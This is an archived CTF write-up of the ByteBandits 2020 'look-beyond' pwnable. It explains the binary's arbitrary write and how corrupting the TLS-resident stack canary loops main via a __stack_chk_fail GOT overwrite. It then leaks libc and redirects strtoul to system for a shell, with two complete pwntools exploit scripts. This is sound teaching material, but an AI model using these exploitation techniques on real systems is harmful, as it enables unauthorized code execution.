# look-beyond

**CTF:** ByteBandits 2020  
**Category:** misc  
**Original writeup:** <https://fireshellsecurity.team/byte-bandits-look-beyond/> — by **fireshellsecurity.team**. All credit goes to the original author; this is an archived copy.

---

This weekend, we played Byte Bandits CTF and we finished 9th! It was a really good CTF, the level of the challenges were higher than last year, so, they deserve better weight at CTFTime. We will talk about our solution for the challenge Look Beyond, it was a nice pwnable that took us some time to solve.

The Challenge

We were given a dist.zip file with other 3 files inside: The binary chall , a Dockerfile and the libc file.

The Dockerfile contained only one line:

FROM ubuntu:18.04

Cool, the challenge is running on an Ubuntu container with version 18.04. It is very kind to release a Dockerfile to players, so, thank you organizers.

The next step is to analyze the binary, we used IDA in this part of the task, but, you can use Ghidra or something else. You can see by the generated pseudocode below, that the main function is not too complicated.

__int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { __int64 size ; // ST00_8 _BYTE * v4 ; // ST08_8 void * buf ; // ST18_8 char v7 ; // [rsp+20h] [rbp-30h] unsigned __int64 v8 ; // [rsp+48h] [rbp-8h] v8 = __readfsqword ( 0x28u ); if ( dword_60107C ) { if ( dword_60107C == 1 ) { a2 = ( char ** ) & puts ; printf ( "puts: %p

" , & puts , a3 ); } } else { setvbuf ( stdout , 0LL , 2 , 0LL ); a2 = 0LL ; setvbuf ( stdin , 0LL , 2 , 0LL ); } printf ( "size: " , a2 ); size = sub_400777 ( & v7 ); v4 = malloc ( size ); printf ( "idx: " , size ); v4 [ sub_400777 ( & v7 )] = 1 ; printf ( "where: " ); buf = ( void * ) sub_400777 ( & v7 ); printf ( "%ld" , buf ); read ( 0 , buf , 8uLL ); dword_60107C = 1 ; return 0LL ; }

Let’s step through the code.

First, it checks if the pointer at 0x60107c contains 1 , if it does, it will give the address of the puts function, so, we would get a free leak here. However, when we execute the binary, it always takes the second path.

Next, it asks us for a size, then, it does malloc the size we input. This ability to allocate any size is crucial our solution, it will be clearer later.

So far, so good. The next thing the program does, it is asking us for an index , so, it will write 1 at the allocated address at v4 , plus our index. So, if you allocate 32 bytes and malloc returns the address 0x602060 , then, if you input the the index 1 , it will write 1 at 0x602261 . This part of the code seems meaningless, but, it is just one more thing crucial for us.

Continuing, the program asks for an address and after for a value. We have an arbitrary write here! So, we can write anything anywhere, obviously, if we know where to write and what to write.

And finally, the program writes 1 at 0x60107c and terminates.

Now, if you pay enough attention, remember that, if 0x60107c contains 1 , we would have a free leak of the puts function address, in fact, the program itself does care of writing 1 at 0x60107c , but, as soon it does write, the program just terminates! We can assume then, that somehow, we must create a loop back to main and get our free leak.

The Solution

This part of the challenge tooks a long time, since, we were almost running out of ideas and after a lot of tried things that didn’t work, like, trying to find pointers at the exit handlers to overwrite. Turns out that, when we were searching for things related to the behaviour of malloc when allocating a huge amount of memory, we stumbled at this awesome repo. Looking at the repo carefully, we found this jewel: Secret of a mysterious section - .tls.

We won’t go into details about the tls section , as by the time of this write-up, in fact, we don’t know much. The important part is: There is some useful information on .tls, such as the address of main_arena, canary (value of stack guard), and a strange stack address which points to somewhere on the stack but with a fixed offset. Wait! What? Stack canary will be there? Summing up, if we can allocate a huge size, like 0x21000 bytes, the stack canary will be written into this segment of memory. Now, the most attention readers will notice that, as we can write 1 at the allocated address plus an arbitrary index, we are able to corrupt the stack canary and therefore call __stack_chk_fail .

Finally, we can combine the thing above to create our loop! So, the plan is:

Allocate 0x21000 bytes

Input the index that is the distance between the allocated address and the stack canary

Use the arbitrary write to overwrite the GOT entry of __stack_chk_fail to address 0x4007d6 (main function)

This is our exploit code by now:

#!/usr/bin/env python from pwn import * import sys # print address def pa ( addr ): info ( " %#x " , addr ) def exploit (): MAIN_ADDR = 0x4007d6 STACK_CHK_FAIL_GOT = 0x601018 p . sendlineafter ( ' size: ' , ' 135168 ' ) p . sendlineafter ( ' idx: ' , ' 144600 ' ) p . sendafter ( ' where: ' , str ( STACK_CHK_FAIL_GOT )) p . send ( p64 ( MAIN_ADDR )) p . interactive () if __name__ == ' __main__ ' : libc = ELF ( ' ./libc.so.6 ' ) p = process ( ' ./chall ' ) exploit ()

Sweet. Now, the program will run main again and, as 0x60107C holds the value 1 , we will have the puts function leak and can calculate the libc base address.

The next thing to do is figure out a way to get a shell. Turns out that, we can use our arbitrary write to overwrite another GOT entry, like strtoul to system , but, we would need a new loop interaction. Although __stack_chk_fail GOT entry was overwritten, this function is only called if the stack canary is corrupted. So, we must corrupt the canary again to get another loop interaction.

The solution is to use the same trick we did before: Allocate a huge size. This time malloc won’t allocate a new segment, it will just resize the segment we allocated before! It is just a matter of calculate the new distance to the canary and send the index.

Finally, use the arbitrary write to turn strtoul into system and, when the next loop interaction comes, send /bin/sh to get the shell.

The complete exploit code is below:

#!/usr/bin/env python from pwn import * import sys import time # print address def pa ( addr ): info ( " %#x " , addr ) def exploit (): MAIN_ADDR = 0x4007d6 STACK_CHK_FAIL_GOT = 0x601018 STRTOUL_GOT = 0x601048 p . sendlineafter ( ' size: ' , ' 135168 ' ) p . sendlineafter ( ' idx: ' , ' 144600 ' ) p . sendafter ( ' where: ' , str ( STACK_CHK_FAIL_GOT )) p . send ( p64 ( MAIN_ADDR )) p . recvuntil ( ' puts: ' ) puts_leak = int ( p . recvline (). strip (), 16 ) libc_base = puts_leak - libc . sym [ ' puts ' ] pa ( libc_base ) p . sendlineafter ( ' size: ' , ' 135168 ' ) p . sendlineafter ( ' idx: ' , ' 283865 ' ) p . sendafter ( ' where: ' , str ( STRTOUL_GOT )) system = libc_base + libc . sym [ ' system ' ] p . send ( p64 ( system )) # trigger shell time . sleep ( 0.5 ) p . sendline ( ' /bin/sh ' ) p . interactive () if __name__ == ' __main__ ' : libc = ELF ( ' ./libc.so.6 ' ) if len ( sys . argv ) > 1 : p = remote ( sys . argv [ 1 ], int ( sys . argv [ 2 ])) else : p = process ( ' ./chall ' ) exploit ()

Capture the Flag , Pwnable , Writeup
